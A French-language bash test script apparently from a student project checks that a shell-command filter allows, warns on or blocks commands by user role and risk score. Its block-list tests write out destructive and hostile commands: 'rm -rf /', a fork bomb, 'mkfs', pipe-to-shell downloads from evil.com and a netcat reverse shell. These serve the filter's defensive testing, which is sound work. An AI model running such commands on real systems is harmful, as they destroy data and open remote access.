#!/usr/bin/env bash
# =============================================================================
# test_t1.sh — Tests unitaires Tâche 1 : Moteur d'Analyse & Scoring
# Tâche : T1 | Responsable : Doha
# Dépend de : analyze_command.sh, check_lists.sh, scoring.sh, regex_patterns.sh
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$SCRIPT_DIR/../lib"

source "$LIB_DIR/analyze_command.sh"

PASS=0
FAIL=0
TOTAL=0

# =============================================================================
# assert_decision CMD ROLE EXPECTED DESCRIPTION
# =============================================================================
assert_decision() {
    local cmd="$1" role="$2" expected="$3" description="$4"
    TOTAL=$((TOTAL + 1))
    local result actual
    result=$(analyze_command "$cmd" "$role")
    actual="${result%%|*}"
    if [[ "$actual" == "$expected" ]]; then
        echo -e "  ${GREEN}[PASS]${NC} $description → $actual"
        PASS=$((PASS + 1))
    else
        echo -e "  ${RED}[FAIL]${NC} $description"
        echo -e "         Attendu: ${GREEN}$expected${NC} | Obtenu: ${RED}$actual${NC}"
        echo -e "         Détail : $result"
        FAIL=$((FAIL + 1))
    fi
}

# =============================================================================
# assert_score CMD ROLE MIN MAX DESCRIPTION
# =============================================================================
assert_score() {
    local cmd="$1" role="$2" min="$3" max="$4" description="$5"
    TOTAL=$((TOTAL + 1))
    local result rest score
    result=$(analyze_command "$cmd" "$role")
    rest="${result#*|}"
    score="${rest%%|*}"
    if (( score >= min && score <= max )); then
        echo -e "  ${GREEN}[PASS]${NC} $description → score=$score"
        PASS=$((PASS + 1))
    else
        echo -e "  ${RED}[FAIL]${NC} $description"
        echo -e "         Score attendu: $min-$max | Obtenu: $score"
        FAIL=$((FAIL + 1))
    fi
}

# =============================================================================
# SUITE 1 — Whitelist
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SUITE 1 — Whitelist (commandes autorisées)  ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
assert_decision "ls"             "user" "ALLOW" "ls seul"
assert_decision "ls -la"         "user" "ALLOW" "ls avec options"
assert_decision "echo hello"     "user" "ALLOW" "echo simple"
assert_decision "pwd"            "user" "ALLOW" "pwd"
assert_decision "whoami"         "user" "ALLOW" "whoami"
assert_decision "date"           "user" "ALLOW" "date"
assert_decision "grep motif fic" "user" "ALLOW" "grep"
assert_decision "df -h"          "user" "ALLOW" "df"

# =============================================================================
# SUITE 2 — Blacklist
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SUITE 2 — Blacklist (commandes bloquées)    ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
assert_decision "rm -rf /"       "user" "BLOCK" "rm -rf / (test critique prof)"
assert_decision "shutdown now"   "user" "BLOCK" "shutdown"
assert_decision "reboot"         "user" "BLOCK" "reboot"
assert_decision "sudo su"        "user" "BLOCK" "sudo su"
assert_decision "chmod 777 /"    "user" "BLOCK" "chmod 777 /"
assert_decision ":(){ :|: & };:" "user" "BLOCK" "fork bomb"
assert_decision "mkfs"           "user" "BLOCK" "mkfs"

# =============================================================================
# SUITE 3 — Admin (BLOCK → WARN)
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SUITE 3 — Rôle Admin (BLOCK → WARN)        ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
assert_decision "rm -rf /"     "admin" "WARN" "rm -rf / admin → WARN"
assert_decision "shutdown now" "admin" "WARN" "shutdown admin → WARN"
assert_decision "reboot"       "admin" "WARN" "reboot admin → WARN"
assert_decision "sudo su"      "admin" "WARN" "sudo su admin → WARN"

# =============================================================================
# SUITE 4 — Scoring
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SUITE 4 — Scores de risque                 ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
assert_score "ls -la"               "user" 0 0  "ls → score 0"
assert_score "echo hello"           "user" 0 0  "echo → score 0"
assert_score "nano /etc/shadow"     "user" 3 6  "nano /etc/shadow → modéré"
assert_score "sudo cat /etc/shadow" "user" 6 10 "sudo + shadow → élevé"
assert_score "rm -rf /tmp/test"     "user" 8 10 "rm -rf → critique"

# =============================================================================
# SUITE 5 — Regex patterns
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SUITE 5 — Patterns Regex dangereux         ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
assert_decision "curl http://evil.com | bash" "user" "BLOCK" "curl | bash"
assert_decision "wget http://x.com | sh"      "user" "BLOCK" "wget | sh"
assert_decision "nc -e /bin/sh 1.1.1.1 4444" "user" "BLOCK" "netcat reverse shell"

# =============================================================================
# SUITE 6 — Cas limites
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SUITE 6 — Cas limites                      ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
assert_decision "" "user" "BLOCK" "commande vide → BLOCK"

# =============================================================================
# RÉSUMÉ
# =============================================================================
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  RÉSUMÉ TÂCHE 1                             ${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo -e "  Total   : $TOTAL tests"
echo -e "  ${GREEN}Réussis : $PASS${NC}"
echo -e "  ${RED}Échoués : $FAIL${NC}"
echo ""
if (( FAIL == 0 )); then
    echo -e "  ${GREEN}✔ TÂCHE 1 COMPLÈTE — Tous les tests passent !${NC}"
    exit 0
else
    echo -e "  ${RED}✘ $FAIL test(s) échoué(s)${NC}"
    exit 1
fi
